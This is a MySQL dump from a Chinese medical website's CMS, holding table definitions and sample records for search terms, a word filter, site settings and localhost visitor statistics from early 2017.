INSERT INTO `jc_score_record` VALUES ('20', '1', '29', '1');
INSERT INTO `jc_score_record` VALUES ('21', '1', '28', '1');
INSERT INTO `jc_score_record` VALUES ('22', '1', '23', '11');
INSERT INTO `jc_score_record` VALUES ('23', '5', '28', '1');

-- ----------------------------
-- Table structure for jc_search_words
-- ----------------------------
DROP TABLE IF EXISTS `jc_search_words`;
CREATE TABLE `jc_search_words` (
  `word_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT '搜索词汇',
  `hit_count` int(11) NOT NULL DEFAULT '0' COMMENT '搜索次数',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '优先级',
  `name_initial` varchar(500) NOT NULL DEFAULT '' COMMENT '拼音首字母',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '推荐',
  `site_id` int(11) NOT NULL DEFAULT '1' COMMENT '站点',
  PRIMARY KEY (`word_id`)
) ENGINE=InnoDB AUTO_INCREMENT=44 DEFAULT CHARSET=utf8 COMMENT='搜索热词';

-- ----------------------------
-- Records of jc_search_words
-- ----------------------------
INSERT INTO `jc_search_words` VALUES ('1', '台湾地震', '7', '10', 'twdz', '1', '1');
INSERT INTO `jc_search_words` VALUES ('5', '楼市', '65', '2', 'ls', '1', '1');
INSERT INTO `jc_search_words` VALUES ('6', '四川', '3', '11', 'sc', '1', '1');
INSERT INTO `jc_search_words` VALUES ('7', '黄金接连下跌', '13', '10', 'hjjlxd', '1', '1');
INSERT INTO `jc_search_words` VALUES ('8', '里约奥运会', '2', '12', 'lyayh', '1', '1');
INSERT INTO `jc_search_words` VALUES ('9', '电信诈骗', '24', '10', 'dxzp', '1', '1');
INSERT INTO `jc_search_words` VALUES ('10', '雷洋案', '12', '11', 'lya', '1', '1');
INSERT INTO `jc_search_words` VALUES ('13', '2015各行业平均工资', '9', '10', '2015gxypjgz', '1', '1');
INSERT INTO `jc_search_words` VALUES ('14', '太阳的后裔', '10', '10', 'tydhy', '1', '1');
INSERT INTO `jc_search_words` VALUES ('15', '广西 ', '1', '10', 'gx', '0', '1');
INSERT INTO `jc_search_words` VALUES ('17', '莆田系', '17', '10', 'ptx', '1', '1');
INSERT INTO `jc_search_words` VALUES ('18', '巴基斯坦', '1', '10', 'bjst', '0', '1');
INSERT INTO `jc_search_words` VALUES ('21', '北京', '1', '10', 'bj', '0', '1');
INSERT INTO `jc_search_words` VALUES ('29', '中级java工程师', '1', '10', 'zjjavagcs', '0', '1');
INSERT INTO `jc_search_words` VALUES ('30', '高考', '1', '10', 'gk', '0', '1');
INSERT INTO `jc_search_words` VALUES ('31', '请输入关键词', '2', '10', 'qsrgjc', '0', '1');
INSERT INTO `jc_search_words` VALUES ('32', '全文检索测试', '1', '10', 'qwjscs', '0', '1');
INSERT INTO `jc_search_words` VALUES ('33', '草原天路收费', '3', '11', 'cytlsf', '1', '1');
INSERT INTO `jc_search_words` VALUES ('34', '世界', '1', '10', 'sj', '0', '1');
INSERT INTO `jc_search_words` VALUES ('35', 'caihongyixue', '1', '10', 'caihongyixue', '0', '1');
INSERT INTO `jc_search_words` VALUES ('37', '涓浗寤鸿', '1', '10', '涓??寤h?', '0', '1');
INSERT INTO `jc_search_words` VALUES ('38', '高考减招', '22', '10', 'gkjz', '1', '1');
INSERT INTO `jc_search_words` VALUES ('39', '1234＃/', '1', '10', '1234＃/', '0', '1');
INSERT INTO `jc_search_words` VALUES ('40', '李克强', '1', '10', 'lkq', '0', '1');
INSERT INTO `jc_search_words` VALUES ('41', '年', '1', '10', 'n', '0', '1');
INSERT INTO `jc_search_words` VALUES ('42', '嘻嘻嘻', '1', '10', 'xxx', '0', '1');
INSERT INTO `jc_search_words` VALUES ('43', '按地方撒', '1', '10', 'adfs', '0', '1');

-- ----------------------------
-- Table structure for jc_sensitivity
-- ----------------------------
DROP TABLE IF EXISTS `jc_sensitivity`;
CREATE TABLE `jc_sensitivity` (
  `sensitivity_id` int(11) NOT NULL AUTO_INCREMENT,
  `search` varchar(255) NOT NULL COMMENT '敏感词',
  `replacement` varchar(255) NOT NULL COMMENT '替换词',
  PRIMARY KEY (`sensitivity_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS敏感词表';

-- ----------------------------
-- Records of jc_sensitivity
-- ----------------------------
INSERT INTO `jc_sensitivity` VALUES ('1', '法论功', '***');

-- ----------------------------
-- Table structure for jc_site
-- ----------------------------
DROP TABLE IF EXISTS `jc_site`;
CREATE TABLE `jc_site` (
  `site_id` int(11) NOT NULL AUTO_INCREMENT,
  `config_id` int(11) NOT NULL COMMENT '配置ID',
  `ftp_upload_id` int(11) DEFAULT NULL COMMENT '上传ftp',
  `domain` varchar(50) NOT NULL COMMENT '域名',
  `site_path` varchar(20) NOT NULL COMMENT '路径',
  `site_name` varchar(100) NOT NULL COMMENT '网站名称',
  `short_name` varchar(100) NOT NULL COMMENT '简短名称',
  `protocol` varchar(20) NOT NULL DEFAULT 'http://' COMMENT '协议',
  `dynamic_suffix` varchar(10) NOT NULL DEFAULT '.jhtml' COMMENT '动态页后缀',
  `static_suffix` varchar(10) NOT NULL DEFAULT '.html' COMMENT '静态页后缀',
  `static_dir` varchar(50) DEFAULT NULL COMMENT '静态页存放目录',
  `is_index_to_root` char(1) NOT NULL DEFAULT '0' COMMENT '是否使用将首页放在根目录下',
  `is_static_index` char(1) NOT NULL DEFAULT '0' COMMENT '是否静态化首页',
  `locale_admin` varchar(10) NOT NULL DEFAULT 'zh_CN' COMMENT '后台本地化',
  `locale_front` varchar(10) NOT NULL DEFAULT 'zh_CN' COMMENT '前台本地化',
  `tpl_solution` varchar(50) NOT NULL DEFAULT 'default' COMMENT '模板方案',
  `final_step` tinyint(4) NOT NULL DEFAULT '2' COMMENT '终审级别',
  `after_check` tinyint(4) NOT NULL DEFAULT '2' COMMENT '审核后(1:不能修改删除;2:修改后退回;3:修改后不变)',
  `is_relative_path` char(1) NOT NULL DEFAULT '1' COMMENT '是否使用相对路径',
  `is_recycle_on` char(1) NOT NULL DEFAULT '1' COMMENT '是否开启回收站',
  `domain_alias` varchar(255) DEFAULT NULL COMMENT '域名别名',
  `domain_redirect` varchar(255) DEFAULT NULL COMMENT '域名重定向',
  `is_master` tinyint(1) DEFAULT '0' COMMENT '是否主站',
  `parent_id` int(11) DEFAULT NULL COMMENT '父站点id',
  `tpl_index` varchar(255) DEFAULT NULL COMMENT '首页模板',
  `access_path` varchar(50) DEFAULT NULL COMMENT '访问路径',
  `keywords` varchar(255) DEFAULT NULL COMMENT '站点关键字',
  `description` varchar(255) DEFAULT NULL COMMENT '站点描述',
  `tpl_mobile_solution` varchar(50) NOT NULL DEFAULT 'mobile' COMMENT '手机站模板方案',
  `mobile_static_dir` varchar(50) DEFAULT '/wap' COMMENT '手机站静态页存放目录',
  `mobile_static_sync` tinyint(1) NOT NULL DEFAULT '0' COMMENT '手机站静态页同步生成',
  `ftp_sync_page_id` int(11) DEFAULT NULL COMMENT '静态页同步FTP',
  `page_is_sync_ftp` tinyint(1) NOT NULL DEFAULT '0' COMMENT '静态页同步发布FTP',
  `resouce_is_sync_ftp` tinyint(1) NOT NULL DEFAULT '0' COMMENT '资源同步发布FTP',
  PRIMARY KEY (`site_id`),
  UNIQUE KEY `ak_domain_path` (`domain`,`access_path`),
  KEY `fk_jc_site_config` (`config_id`),
  KEY `fk_jc_site_upload_ftp` (`ftp_upload_id`),
  KEY `fk_jc_site_parent` (`parent_id`),
  CONSTRAINT `fk_jc_site_config` FOREIGN KEY (`config_id`) REFERENCES `jc_config` (`config_id`),
  CONSTRAINT `fk_jc_site_parent` FOREIGN KEY (`parent_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_site_upload_ftp` FOREIGN KEY (`ftp_upload_id`) REFERENCES `jo_ftp` (`ftp_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS站点表';

-- ----------------------------
-- Records of jc_site
-- ----------------------------
INSERT INTO `jc_site` VALUES ('1', '1', null, 'www.caihongyixue.com', 'www', '彩虹医学网', '彩虹医学网', 'http://', '.jhtml', '.html', '/html', '0', '0', 'zh_CN', 'zh_CN', 'default', '3', '3', '0', '1', '', '', '1', null, '', '', '彩虹医学网|病理精诊诊断中心', '彩虹医学网', 'mobile', '/wap', '0', null, '0', '0');

-- ----------------------------
-- Table structure for jc_site_access
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_access`;
CREATE TABLE `jc_site_access` (
  `access_id` int(11) NOT NULL AUTO_INCREMENT,
  `session_id` varchar(32) NOT NULL DEFAULT '',
  `site_id` int(11) NOT NULL COMMENT '站点id',
  `access_time` time NOT NULL COMMENT '访问时间',
  `access_date` date NOT NULL COMMENT '访问日期',
  `ip` varchar(50) NOT NULL DEFAULT '',
  `area` varchar(50) DEFAULT NULL COMMENT '访问地区',
  `access_source` varchar(255) DEFAULT NULL COMMENT '访问来源',
  `external_link` varchar(255) DEFAULT NULL COMMENT '外部链接网址',
  `engine` varchar(50) DEFAULT NULL COMMENT '搜索引擎',
  `entry_page` varchar(255) DEFAULT NULL COMMENT '入口页面',
  `last_stop_page` varchar(255) DEFAULT NULL COMMENT '最后停留页面',
  `visit_second` int(11) DEFAULT NULL COMMENT '访问时长(秒)',
  `visit_page_count` int(11) DEFAULT NULL COMMENT '访问页面数',
  `operating_system` varchar(50) DEFAULT NULL COMMENT '操作系统',
  `browser` varchar(50) DEFAULT NULL COMMENT '浏览器',
  `keyword` varchar(255) DEFAULT NULL COMMENT '来访关键字',
  PRIMARY KEY (`access_id`),
  KEY `fk_jc_access_site` (`site_id`),
  CONSTRAINT `fk_jc_access_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=191 DEFAULT CHARSET=utf8 COMMENT='站点访问表';

-- ----------------------------
-- Records of jc_site_access
-- ----------------------------
INSERT INTO `jc_site_access` VALUES ('181', 'AD83FF2205B83CFC0847CCEC852578AE', '1', '01:34:41', '2017-02-05', '127.0.0.1', '', '直接访问', null, null, 'http://www.caihongyixue.com/zjtd/index.jhtml', 'http://www.caihongyixue.com/zjtd/index.jhtml', '1764', '3', 'Win 7', 'chrome 53', '');
INSERT INTO `jc_site_access` VALUES ('182', '474A056B7CD1E5F733BBA6555A64AABD', '1', '02:59:12', '2017-02-05', '127.0.0.1', '', '直接访问', null, null, 'http://www.caihongyixue.com/?tmppass=123321', 'http://www.caihongyixue.com/?tmppass=123321', '1939', '6', 'Win 7', 'chrome 53', '');
INSERT INTO `jc_site_access` VALUES ('183', 'B4BA4F86AAEB3425E3DFDDD983916695', '1', '02:59:38', '2017-02-05', '127.0.0.1', '', '直接访问', null, null, 'http://www.caihongyixue.com/?tmppass=123321', 'http://www.caihongyixue.com/?tmppass=123321', '2105', '2', 'Win 7', 'chrome 45', '');
INSERT INTO `jc_site_access` VALUES ('184', '2D0F92E2F77D925EC9B1E41145FD33F4', '1', '11:42:39', '2017-02-05', '127.0.0.1', '', '直接访问', null, null, 'http://www.caihongyixue.com/?tmppass=123321', 'http://www.caihongyixue.com/?tmppass=123321', '0', '1', 'Win 7', 'chrome 53', '');
INSERT INTO `jc_site_access` VALUES ('185', '4F95342DB657312464B1F71539287299', '1', '12:41:13', '2017-02-05', '127.0.0.1', '', '直接访问', null, null, 'http://www.caihongyixue.com/?tmppass=123321', 'http://www.caihongyixue.com/?tmppass=123321', '0', '1', 'Win 7', 'chrome 53', '');
INSERT INTO `jc_site_access` VALUES ('186', 'AE34C00D6B8FEF5582F76A59FA6728AB', '1', '13:12:03', '2017-02-05', '127.0.0.1', '', '直接访问', null, null, 'http://www.caihongyixue.com/?tmppass=123321', 'http://www.caihongyixue.com/?tmppass=123321', '0', '1', 'Win 7', 'chrome 53', '');
INSERT INTO `jc_site_access` VALUES ('187', '07682D1E5644FAA4CF02DD10EF966BAC', '1', '13:38:37', '2017-02-05', '127.0.0.1', '', '直接访问', null, null, 'http://www.caihongyixue.com/comment.jspx?contentId=28', 'http://www.caihongyixue.com/comment.jspx?contentId=28', '0', '2', 'Win 7', 'chrome 53', '');
INSERT INTO `jc_site_access` VALUES ('188', 'CEEA4F982294CF9493A52E178FD64A3D', '1', '14:12:09', '2017-02-05', '127.0.0.1', '', '直接访问', null, null, 'http://www.caihongyixue.com/?tmppass=123321', 'http://www.caihongyixue.com/?tmppass=123321', '2', '2', 'Win 7', 'chrome 53', '');
INSERT INTO `jc_site_access` VALUES ('189', '2EC4842F30B02C0A84DEE178B2C690D1', '1', '14:35:49', '2017-02-05', '127.0.0.1', '', '直接访问', null, null, 'http://www.caihongyixue.com/?tmppass=123321', 'http://www.caihongyixue.com/?tmppass=123321', '0', '1', 'Win 7', 'chrome 53', '');
INSERT INTO `jc_site_access` VALUES ('190', '61071916EBFCD8F2F32FF091523152F1', '1', '15:56:59', '2017-02-05', '127.0.0.1', '', '直接访问', null, null, 'http://www.caihongyixue.com/?tmppass=123321', 'http://www.caihongyixue.com/yyhz/index.jhtml', '651', '7', 'Win 7', 'chrome 53', '');

-- ----------------------------
-- Table structure for jc_site_access_count
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_access_count`;
CREATE TABLE `jc_site_access_count` (
  `access_count` int(11) NOT NULL AUTO_INCREMENT,
  `page_count` int(11) NOT NULL DEFAULT '1' COMMENT '访问页数',
  `visitors` int(11) NOT NULL DEFAULT '0' COMMENT '用户数',
  `statistic_date` date NOT NULL COMMENT '统计日期',
  `site_id` int(11) NOT NULL COMMENT '统计站点',
  PRIMARY KEY (`access_count`),
  KEY `fk_jc_access_count_site` (`site_id`),
  CONSTRAINT `fk_jc_access_count_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=365 DEFAULT CHARSET=utf8 COMMENT='每日统计页数访问情况';

-- ----------------------------
-- Records of jc_site_access_count
-- ----------------------------
INSERT INTO `jc_site_access_count` VALUES ('269', '2', '3', '2017-01-13', '1');
INSERT INTO `jc_site_access_count` VALUES ('270', '1', '2', '2017-01-13', '1');
INSERT INTO `jc_site_access_count` VALUES ('271', '3', '2', '2017-01-13', '1');
INSERT INTO `jc_site_access_count` VALUES ('272', '4', '3', '2017-01-14', '1');
INSERT INTO `jc_site_access_count` VALUES ('273', '2', '2', '2017-01-14', '1');
INSERT INTO `jc_site_access_count` VALUES ('274', '1', '1', '2017-01-14', '1');
INSERT INTO `jc_site_access_count` VALUES ('275', '7', '1', '2017-01-14', '1');
INSERT INTO `jc_site_access_count` VALUES ('276', '17', '1', '2017-01-14', '1');
INSERT INTO `jc_site_access_count` VALUES ('277', '25', '1', '2017-01-14', '1');
INSERT INTO `jc_site_access_count` VALUES ('278', '81', '1', '2017-01-14', '1');
INSERT INTO `jc_site_access_count` VALUES ('279', '1', '2', '2017-01-15', '1');
INSERT INTO `jc_site_access_count` VALUES ('280', '3', '2', '2017-01-15', '1');
INSERT INTO `jc_site_access_count` VALUES ('281', '16', '1', '2017-01-15', '1');
INSERT INTO `jc_site_access_count` VALUES ('282', '17', '1', '2017-01-15', '1');
INSERT INTO `jc_site_access_count` VALUES ('283', '26', '1', '2017-01-15', '1');
INSERT INTO `jc_site_access_count` VALUES ('284', '33', '1', '2017-01-15', '1');
INSERT INTO `jc_site_access_count` VALUES ('285', '36', '1', '2017-01-15', '1');
INSERT INTO `jc_site_access_count` VALUES ('286', '58', '1', '2017-01-15', '1');
INSERT INTO `jc_site_access_count` VALUES ('287', '69', '1', '2017-01-15', '1');
INSERT INTO `jc_site_access_count` VALUES ('288', '9', '1', '2017-01-15', '1');
INSERT INTO `jc_site_access_count` VALUES ('289', '11', '1', '2017-01-15', '1');
INSERT INTO `jc_site_access_count` VALUES ('290', '1', '2', '2017-01-16', '1');
INSERT INTO `jc_site_access_count` VALUES ('291', '8', '2', '2017-01-16', '1');
INSERT INTO `jc_site_access_count` VALUES ('292', '2', '1', '2017-01-16', '1');
INSERT INTO `jc_site_access_count` VALUES ('293', '4', '1', '2017-01-16', '1');
INSERT INTO `jc_site_access_count` VALUES ('294', '6', '1', '2017-01-16', '1');
INSERT INTO `jc_site_access_count` VALUES ('295', '10', '1', '2017-01-16', '1');
INSERT INTO `jc_site_access_count` VALUES ('296', '22', '1', '2017-01-16', '1');
INSERT INTO `jc_site_access_count` VALUES ('297', '85', '1', '2017-01-16', '1');
INSERT INTO `jc_site_access_count` VALUES ('298', '110', '1', '2017-01-16', '1');
INSERT INTO `jc_site_access_count` VALUES ('299', '2', '9', '2017-01-17', '1');
INSERT INTO `jc_site_access_count` VALUES ('300', '3', '5', '2017-01-17', '1');
INSERT INTO `jc_site_access_count` VALUES ('301', '1', '2', '2017-01-17', '1');
INSERT INTO `jc_site_access_count` VALUES ('302', '4', '2', '2017-01-17', '1');
INSERT INTO `jc_site_access_count` VALUES ('303', '6', '2', '2017-01-17', '1');
INSERT INTO `jc_site_access_count` VALUES ('304', '16', '2', '2017-01-17', '1');
INSERT INTO `jc_site_access_count` VALUES ('305', '46', '1', '2017-01-17', '1');
INSERT INTO `jc_site_access_count` VALUES ('306', '5', '1', '2017-01-17', '1');
INSERT INTO `jc_site_access_count` VALUES ('307', '7', '1', '2017-01-17', '1');
INSERT INTO `jc_site_access_count` VALUES ('308', '10', '1', '2017-01-17', '1');
INSERT INTO `jc_site_access_count` VALUES ('309', '13', '1', '2017-01-17', '1');
INSERT INTO `jc_site_access_count` VALUES ('310', '15', '1', '2017-01-17', '1');
INSERT INTO `jc_site_access_count` VALUES ('311', '1', '8', '2017-01-18', '1');
INSERT INTO `jc_site_access_count` VALUES ('312', '2', '2', '2017-01-18', '1');
INSERT INTO `jc_site_access_count` VALUES ('313', '3', '2', '2017-01-18', '1');
INSERT INTO `jc_site_access_count` VALUES ('314', '4', '2', '2017-01-18', '1');
INSERT INTO `jc_site_access_count` VALUES ('315', '5', '1', '2017-01-18', '1');
INSERT INTO `jc_site_access_count` VALUES ('316', '6', '1', '2017-01-18', '1');
INSERT INTO `jc_site_access_count` VALUES ('317', '7', '1', '2017-01-18', '1');
INSERT INTO `jc_site_access_count` VALUES ('318', '2', '4', '2017-01-19', '1');
INSERT INTO `jc_site_access_count` VALUES ('319', '1', '3', '2017-01-19', '1');
INSERT INTO `jc_site_access_count` VALUES ('320', '3', '1', '2017-01-19', '1');
INSERT INTO `jc_site_access_count` VALUES ('321', '4', '1', '2017-01-19', '1');
INSERT INTO `jc_site_access_count` VALUES ('322', '7', '1', '2017-01-19', '1');
INSERT INTO `jc_site_access_count` VALUES ('323', '9', '1', '2017-01-19', '1');
INSERT INTO `jc_site_access_count` VALUES ('324', '1', '3', '2017-01-20', '1');
INSERT INTO `jc_site_access_count` VALUES ('325', '2', '1', '2017-01-20', '1');
INSERT INTO `jc_site_access_count` VALUES ('326', '1', '1', '2017-01-21', '1');
INSERT INTO `jc_site_access_count` VALUES ('327', '3', '1', '2017-01-21', '1');
INSERT INTO `jc_site_access_count` VALUES ('328', '1', '6', '2017-01-22', '1');
INSERT INTO `jc_site_access_count` VALUES ('329', '2', '3', '2017-01-22', '1');
INSERT INTO `jc_site_access_count` VALUES ('330', '1', '2', '2017-01-23', '1');
INSERT INTO `jc_site_access_count` VALUES ('331', '6', '1', '2017-01-23', '1');
INSERT INTO `jc_site_access_count` VALUES ('332', '7', '1', '2017-01-23', '1');
INSERT INTO `jc_site_access_count` VALUES ('333', '2', '11', '2017-01-24', '1');
INSERT INTO `jc_site_access_count` VALUES ('334', '1', '4', '2017-01-24', '1');
INSERT INTO `jc_site_access_count` VALUES ('335', '3', '4', '2017-01-24', '1');
INSERT INTO `jc_site_access_count` VALUES ('336', '6', '3', '2017-01-24', '1');
INSERT INTO `jc_site_access_count` VALUES ('337', '9', '3', '2017-01-24', '1');
INSERT INTO `jc_site_access_count` VALUES ('338', '25', '1', '2017-01-24', '1');
INSERT INTO `jc_site_access_count` VALUES ('339', '4', '1', '2017-01-24', '1');
INSERT INTO `jc_site_access_count` VALUES ('340', '5', '1', '2017-01-24', '1');
INSERT INTO `jc_site_access_count` VALUES ('341', '7', '1', '2017-01-24', '1');
INSERT INTO `jc_site_access_count` VALUES ('342', '8', '1', '2017-01-24', '1');
INSERT INTO `jc_site_access_count` VALUES ('343', '13', '1', '2017-01-24', '1');
INSERT INTO `jc_site_access_count` VALUES ('344', '19', '1', '2017-01-24', '1');
INSERT INTO `jc_site_access_count` VALUES ('345', '2', '5', '2017-01-25', '1');
INSERT INTO `jc_site_access_count` VALUES ('346', '1', '4', '2017-01-25', '1');
INSERT INTO `jc_site_access_count` VALUES ('347', '3', '1', '2017-01-25', '1');
INSERT INTO `jc_site_access_count` VALUES ('348', '4', '1', '2017-01-25', '1');
INSERT INTO `jc_site_access_count` VALUES ('349', '13', '1', '2017-01-25', '1');
INSERT INTO `jc_site_access_count` VALUES ('350', '19', '1', '2017-01-25', '1');
INSERT INTO `jc_site_access_count` VALUES ('351', '2', '1', '2017-01-27', '1');
INSERT INTO `jc_site_access_count` VALUES ('352', '2', '1', '2017-01-28', '1');
INSERT INTO `jc_site_access_count` VALUES ('353', '3', '2', '2017-01-29', '1');
INSERT INTO `jc_site_access_count` VALUES ('354', '2', '1', '2017-01-30', '1');
INSERT INTO `jc_site_access_count` VALUES ('355', '1', '1', '2017-01-31', '1');
INSERT INTO `jc_site_access_count` VALUES ('356', '2', '1', '2017-01-31', '1');
INSERT INTO `jc_site_access_count` VALUES ('357', '2', '3', '2017-02-01', '1');
INSERT INTO `jc_site_access_count` VALUES ('358', '1', '2', '2017-02-01', '1');
INSERT INTO `jc_site_access_count` VALUES ('359', '3', '2', '2017-02-01', '1');
INSERT INTO `jc_site_access_count` VALUES ('360', '1', '1', '2017-02-02', '1');
INSERT INTO `jc_site_access_count` VALUES ('361', '1', '1', '2017-02-04', '1');
INSERT INTO `jc_site_access_count` VALUES ('362', '4', '1', '2017-02-04', '1');
INSERT INTO `jc_site_access_count` VALUES ('363', '7', '1', '2017-02-04', '1');
INSERT INTO `jc_site_access_count` VALUES ('364', '16', '1', '2017-02-04', '1');

-- ----------------------------
-- Table structure for jc_site_access_pages
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_access_pages`;
CREATE TABLE `jc_site_access_pages` (
  `access_pages_id` int(11) NOT NULL AUTO_INCREMENT,
  `access_page` varchar(255) NOT NULL COMMENT '访问页面',
  `session_id` varchar(32) NOT NULL,
  `access_date` date NOT NULL DEFAULT '0000-00-00' COMMENT '访问日期',
  `access_time` time NOT NULL COMMENT '访问时间',
  `visit_second` int(11) NOT NULL DEFAULT '0' COMMENT '停留时长（秒）',
  `page_index` int(11) NOT NULL DEFAULT '0' COMMENT '用户访问页面的索引',
  `site_id` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`access_pages_id`),
  KEY `fk_jc_access_pages_access` (`session_id`)
) ENGINE=InnoDB AUTO_INCREMENT=858 DEFAULT CHARSET=utf8 COMMENT='访问详细页面表';

-- ----------------------------
-- Records of jc_site_access_pages
-- ----------------------------
INSERT INTO `jc_site_access_pages` VALUES ('836', 'http://www.caihongyixue.com/zjtd/index_2.jhtml', 'B7D67DA52E4C8A59F1B217425655ECC0', '2017-02-05', '00:02:59', '0', '6', '1');
INSERT INTO `jc_site_access_pages` VALUES ('837', 'http://www.caihongyixue.com/zjtd/index.jhtml', 'B7D67DA52E4C8A59F1B217425655ECC0', '2017-02-05', '00:02:43', '1', '4', '1');
INSERT INTO `jc_site_access_pages` VALUES ('838', 'http://www.caihongyixue.com/zjtd/index_2.jhtml', 'B7D67DA52E4C8A59F1B217425655ECC0', '2017-02-05', '00:02:44', '15', '5', '1');
INSERT INTO `jc_site_access_pages` VALUES ('839', 'http://www.caihongyixue.com/zjtd/index.jhtml', 'AD83FF2205B83CFC0847CCEC852578AE', '2017-02-05', '01:34:42', '0', '1', '1');
INSERT INTO `jc_site_access_pages` VALUES ('840', 'http://www.caihongyixue.com/?tmppass=123321', '474A056B7CD1E5F733BBA6555A64AABD', '2017-02-05', '02:59:12', '2', '2', '1');
INSERT INTO `jc_site_access_pages` VALUES ('841', 'http://www.caihongyixue.com/zjtd/index.jhtml', '474A056B7CD1E5F733BBA6555A64AABD', '2017-02-05', '02:59:14', '75', '3', '1');
INSERT INTO `jc_site_access_pages` VALUES ('842', 'http://www.caihongyixue.com/?tmppass=123321', '474A056B7CD1E5F733BBA6555A64AABD', '2017-02-05', '03:00:29', '0', '4', '1');
INSERT INTO `jc_site_access_pages` VALUES ('843', 'http://www.caihongyixue.com/?tmppass=123321', 'B4BA4F86AAEB3425E3DFDDD983916695', '2017-02-05', '02:59:42', '2101', '1', '1');
INSERT INTO `jc_site_access_pages` VALUES ('844', 'http://www.caihongyixue.com/?tmppass=123321', 'B4BA4F86AAEB3425E3DFDDD983916695', '2017-02-05', '03:34:43', '0', '2', '1');
INSERT INTO `jc_site_access_pages` VALUES ('845', 'http://www.caihongyixue.com/?tmppass=123321', '2D0F92E2F77D925EC9B1E41145FD33F4', '2017-02-05', '11:42:39', '0', '1', '1');
INSERT INTO `jc_site_access_pages` VALUES ('846', 'http://www.caihongyixue.com/?tmppass=123321', '4F95342DB657312464B1F71539287299', '2017-02-05', '12:41:13', '0', '1', '1');
INSERT INTO `jc_site_access_pages` VALUES ('847', 'http://www.caihongyixue.com/?tmppass=123321', 'AE34C00D6B8FEF5582F76A59FA6728AB', '2017-02-05', '13:12:04', '0', '1', '1');
INSERT INTO `jc_site_access_pages` VALUES ('848', 'http://www.caihongyixue.com/comment.jspx?contentId=28', '07682D1E5644FAA4CF02DD10EF966BAC', '2017-02-05', '13:38:38', '0', '2', '1');
INSERT INTO `jc_site_access_pages` VALUES ('849', 'http://www.caihongyixue.com/?tmppass=123321', 'CEEA4F982294CF9493A52E178FD64A3D', '2017-02-05', '14:12:10', '0', '1', '1');
INSERT INTO `jc_site_access_pages` VALUES ('850', 'http://www.caihongyixue.com/?tmppass=123321', '2EC4842F30B02C0A84DEE178B2C690D1', '2017-02-05', '14:35:49', '0', '1', '1');
INSERT INTO `jc_site_access_pages` VALUES ('851', 'http://www.caihongyixue.com/?tmppass=123321', '61071916EBFCD8F2F32FF091523152F1', '2017-02-05', '15:56:59', '1', '1', '1');
INSERT INTO `jc_site_access_pages` VALUES ('852', 'http://www.caihongyixue.com/?tmppass=123321', '61071916EBFCD8F2F32FF091523152F1', '2017-02-05', '15:57:00', '63', '2', '1');
INSERT INTO `jc_site_access_pages` VALUES ('853', 'http://www.caihongyixue.com/?tmppass=123321', '61071916EBFCD8F2F32FF091523152F1', '2017-02-05', '15:58:03', '475', '3', '1');
INSERT INTO `jc_site_access_pages` VALUES ('854', 'http://www.caihongyixue.com/education/index.jhtml', '61071916EBFCD8F2F32FF091523152F1', '2017-02-05', '16:05:58', '6', '4', '1');
INSERT INTO `jc_site_access_pages` VALUES ('855', 'http://www.caihongyixue.com/yyhz/index.jhtml', '61071916EBFCD8F2F32FF091523152F1', '2017-02-05', '16:07:50', '0', '7', '1');
INSERT INTO `jc_site_access_pages` VALUES ('856', 'http://www.caihongyixue.com/yyhz/index.jhtml', '61071916EBFCD8F2F32FF091523152F1', '2017-02-05', '16:06:08', '102', '6', '1');
INSERT INTO `jc_site_access_pages` VALUES ('857', 'http://www.caihongyixue.com/?tmppass=123321', '61071916EBFCD8F2F32FF091523152F1', '2017-02-05', '16:06:04', '4', '5', '1');

-- ----------------------------
-- Table structure for jc_site_access_statistic
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_access_statistic`;
CREATE TABLE `jc_site_access_statistic` (
  `access_statistic_id` int(11) NOT NULL AUTO_INCREMENT,
  `statistic_date` date NOT NULL COMMENT '统计日期',
  `pv` int(11) NOT NULL DEFAULT '0' COMMENT 'pv量',
  `ip` int(11) NOT NULL DEFAULT '0' COMMENT 'ip量',
  `visitors` int(11) NOT NULL DEFAULT '0' COMMENT '访客数量',
  `pages_aver` int(11) NOT NULL DEFAULT '0' COMMENT '人均浏览次数',
  `visit_second_aver` int(11) NOT NULL DEFAULT '0' COMMENT '人均访问时长（秒）',
  `site_id` int(11) NOT NULL COMMENT '站点id',
  `statisitc_type` varchar(255) NOT NULL DEFAULT 'all' COMMENT '统计分类（all代表当天所有访问量的统计）',
  `statistic_column_value` varchar(255) DEFAULT '' COMMENT '统计列值',
  PRIMARY KEY (`access_statistic_id`),
  KEY `fk_jc_access_statistic_site` (`site_id`),
  CONSTRAINT `fk_jc_access_statistic_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=445 DEFAULT CHARSET=utf8 COMMENT='访问统计表';

-- ----------------------------
-- Records of jc_site_access_statistic
-- ----------------------------
INSERT INTO `jc_site_access_statistic` VALUES ('357', '2017-01-13', '14', '1', '7', '2', '27', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('358', '2017-01-13', '14', '1', '7', '2', '27', '1', 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES ('359', '2017-01-14', '144', '1', '10', '14', '-6801', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('360', '2017-01-14', '99', '1', '6', '16', '2100', '1', 'source', '外部链接');
INSERT INTO `jc_site_access_statistic` VALUES ('361', '2017-01-14', '48', '1', '4', '12', '-20142', '1', 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES ('362', '2017-01-14', '4', '1', '1', '4', '1408', '1', 'link', 'http://bbs.caihongyixue.com');
